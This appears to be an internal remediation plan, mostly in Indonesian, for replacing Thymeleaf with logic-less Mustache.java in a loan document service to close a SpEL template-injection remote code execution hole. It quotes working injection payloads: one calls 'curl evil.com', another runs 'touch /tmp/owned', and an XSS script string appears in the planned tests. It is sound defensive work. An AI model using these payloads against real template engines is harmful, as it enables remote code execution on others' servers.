# Plan — Replace Thymeleaf with Mustache.java in `ulos-document-service`

## Context

Document review hari ini ([review-document-service finding L67](docs/plan/2026-05-26-orm-multi-replica-hardening.md)) mengidentifikasi **template injection RCE** kelas 🔴 di `DocumentGeneratorService.java:L141-149`:

```java
String thymeleafTemplate = rawHtml.replace("{{", "[[${").replace("}}", "}]]");
String xhtmlContent = stringTemplateEngine.process(thymeleafTemplate, thymeleafContext);
```

Templates HTML disimpan di `document.tb_document_template.content_html` dan **dapat di-edit user-input** lewat `POST /api/loans/v1/document-templates` (controller saat ini tanpa `@PreAuthorize` — separate finding). Karena Thymeleaf evaluate SpEL (`${...}`), attacker bisa inject:

```
{{T(java.lang.Runtime).getRuntime().exec('curl evil.com')}}
```

→ Thymeleaf process → **RCE di document-service JVM**.

Fix utama: pakai template engine **logic-less** yang tidak evaluate ekspresi. **Mustache** adalah standar industri untuk kasus ini — hanya variable substitution, tidak ada method invocation atau code execution.

Bonus: template syntax di DB dan frontend sudah `{{...}}` (Mustache-native). **Nol perubahan data**, **nol perubahan UI**.

## Outcome

- Thymeleaf dependency dihapus
- Mustache.java (`com.github.spullara.mustache.java:compiler`) menggantikan rendering engine
- Template injection RCE class dieliminasi (Mustache tidak punya expression evaluation)
- Existing templates di DB tetap kompatibel (syntax `{{...}}` sama)
- Frontend Quill editor + `DATABASE_VARIABLES` tidak diubah
- Integration test tambah security assertion

## Critical Files

### Modified

- **`ulos-document-service/pom.xml:L60`** — ganti dependency
  - Hapus: `spring-boot-starter-thymeleaf`
  - Tambah: `com.github.spullara.mustache.java:compiler` (versi `0.9.13`, latest stable)

- **`ulos-document-service/src/main/java/com/ulos/document/service/DocumentGeneratorService.java:L16-17,L34,L141-149`**
  - Hapus imports `org.thymeleaf.TemplateEngine`, `org.thymeleaf.context.Context`
  - Hapus `replace("{{", "[[${").replace("}}", "}]]")` — Mustache pakai `{{...}}` native
  - Ganti `stringTemplateEngine.process(...)` jadi:
    ```java
    Mustache mustache = mustacheFactory.compile(
        new StringReader(rawHtml),
        "doc-template-" + template.getId()
    );
    StringWriter sw = new StringWriter();
    mustache.execute(sw, evalContext).flush();
    String xhtmlContent = sw.toString();
    ```
  - Inject `MustacheFactory mustacheFactory` instead of `TemplateEngine stringTemplateEngine`

### Created

- **`ulos-document-service/src/main/java/com/ulos/document/config/MustacheConfig.java`** (replaces `ThymeleafConfig.java`)
  ```java
  @Configuration
  public class MustacheConfig {
      @Bean
      public MustacheFactory mustacheFactory() {
          // DefaultMustacheFactory caches compiled templates by name.
          // Pass template ID as cache key (see DocumentGeneratorService).
          // HTML-escape by default via {{var}}; use {{{var}}} for raw HTML.
          return new DefaultMustacheFactory();
      }
  }
  ```

### Deleted

- **`ulos-document-service/src/main/java/com/ulos/document/config/ThymeleafConfig.java`** — seluruh file dihapus

## Test Changes

- **`ulos-document-service/src/test/java/com/ulos/document/service/DocumentGeneratorServiceIntegrationTest.java`**
  - Existing test fixture (L79-92) pakai `{{ customer.fullName }}` — pass tanpa perubahan
  - **TAMBAH** test method `shouldNotExecuteCodeFromMaliciousTemplate()`:
    - Inject template content: `Result: {{T(java.lang.Runtime).getRuntime().exec('touch /tmp/owned').toString()}}`
    - Verify: PDF/DOCX render selesai tanpa error
    - Verify: output mengandung literal string `{{T(java.lang.Runtime)...}}` atau empty string (Mustache treat sebagai variable lookup yang miss → empty)
    - Verify: file `/tmp/owned` tidak dibuat (afterEach cleanup + assert before)
  - **TAMBAH** test `shouldEscapeHtmlSpecialCharactersInOutput()`:
    - Customer fullName = `PT. ABC <script>alert(1)</script>`
    - Assert rendered HTML mengandung `&lt;script&gt;` bukan `<script>`
  - **TAMBAH** test `shouldRenderEmptyForMissingVariable()`:
    - Template: `Hello {{nonexistent.field}}`
    - Assert output: `Hello ` (Mustache default — empty for miss)

## Library Choice

`com.github.spullara.mustache.java:compiler` (versi `0.9.13`)
- Paling populer di ekosistem Java
- Mendukung nested property access (`customer.fullName` resolve dari `Map<String, Object>`)
- HTML escape default via `{{var}}`; raw via `{{{var}}}`
- Cache compiled template by name (kita pakai `"doc-template-" + templateId`)
- No SpEL, no OGNL, no code execution — by design

Alternatif `com.samskivert:jmustache` ditolak: smaller ecosystem, less battle-tested.

## Migration Concerns

| Aspek | Status |
|---|---|
| DB template syntax | ✅ Sudah `{{...}}` — no migration |
| Frontend Quill editor variable insert | ✅ Sudah `{{ ${varKey} }}` — no UI change |
| HTML escaping | ✅ Mustache `{{var}}` escapes by default (sama dengan Thymeleaf `[[${var}]]`) |
| Nested property `customer.fullName` | ✅ Mustache resolve dari nested Map natively |
| Conditional/loop (Thymeleaf `th:if`/`th:each`) | ✅ Tidak digunakan saat ini; Mustache punya `{{#section}}{{/section}}` jika butuh nanti |
| openhtmltopdf / docx4j PDF compile | ✅ Tidak terkait — tetap pakai output HTML |
| Frontend preview regex `\{\{\s*([a-zA-Z.]+)\s*\}\}/g` | ✅ Match Mustache syntax |

## Verification

```bash
# 1. Build + unit + integration test
mvn -pl ulos-document-service clean test

# 2. Start service lokal
mvn -pl ulos-document-service spring-boot:run

# 3. End-to-end render PDF
curl -X POST http://localhost:8087/api/loans/v1/documents/generate \
  -H "Authorization: Bearer $JWT" \
  -H "X-Idempotency-Key: $(uuidgen)" \
  -H "Content-Type: application/json" \
  -d '{
    "applicationId": "<existing-uuid>",
    "templateCode": "OFFERING_LETTER_KI",
    "format": "PDF"
  }'
# Expected: 201 + GeneratedDocumentEntity dengan filePath, checksumSha256

# 4. Download + visual inspect
curl http://localhost:8087/api/loans/v1/documents/$DOC_ID/download \
  -H "Authorization: Bearer $JWT" > /tmp/out.pdf && open /tmp/out.pdf
# Expected: PDF render dengan placeholder ter-substitusi

# 5. Security smoke test
# Buat template dengan content_html: "Test: {{T(java.lang.Runtime).getRuntime().exec('touch /tmp/owned')}}"
# Generate document
# Verify:
test ! -f /tmp/owned && echo "PASS: no RCE" || echo "FAIL: RCE happened"
# Plus inspect rendered PDF — should show literal text or empty
```

## Squad Coordination

- **Squad Backend Service** (owner): execute PR
- **Squad Frontend**: no-op, syntax UI tidak berubah
- **Squad Common Lib**: no-op, tidak ada perubahan common
- **Communication**: doc tim BPMN/Designer di Slack #ulos-dev kalau ada template eksisting yang pakai fitur Thymeleaf advanced (saat audit ini: tidak ada)

## Out-of-Scope

- Fix authorization controller `POST /document-templates` (separate PR — RBAC `document_template:manage` + maker-checker)
- Fix `download(id)` ownership check (separate PR — security audit)
- Frontend: tampilkan dokumentasi syntax Mustache di template editor (`{{#section}}...{{/section}}` untuk loop optional)
- Add ADR untuk choice rationale (optional, kalau diminta nanti)

## Risk Assessment

| Risk | Probabilitas | Mitigasi |
|---|---|---|
| Existing template di staging/prod pakai `${...}` Thymeleaf syntax (bukan `{{...}}`) | Rendah — audit menunjukkan template editor produce `{{ }}` | Survey DB sebelum merge: `SELECT count(*) FROM document.tb_document_template WHERE content_html LIKE '%\${%';` |
| Mustache HTML escape behaviour beda dari Thymeleaf | Rendah — keduanya escape `<>&"'` | Integration test baru menutup |
| Mustache reflection-based property access lambat | Rendah — `DefaultMustacheFactory` cache compiled template by name | Beri unique cache key per template ID; benchmark kalau perlu |
| Removed Spring Boot starter ternyata bawa dependency lain | Rendah — `spring-boot-starter-thymeleaf` murni Thymeleaf | `mvn dependency:tree` sebelum dan sesudah; verify diff |

## Effort

| Komponen | Estimasi |
|---|---|
| Edit pom.xml + delete ThymeleafConfig + add MustacheConfig | 15 min |
| Refactor `DocumentGeneratorService.generateDocument(...)` | 30 min |
| Tambah 3 test (security + escape + miss) | 1 jam |
| Run + verify `mvn test` lokal | 15 min |
| Manual smoke test end-to-end (PDF/DOCX) | 30 min |
| **Total** | **~2.5 jam** (1 PR sederhana, 1 dev) |
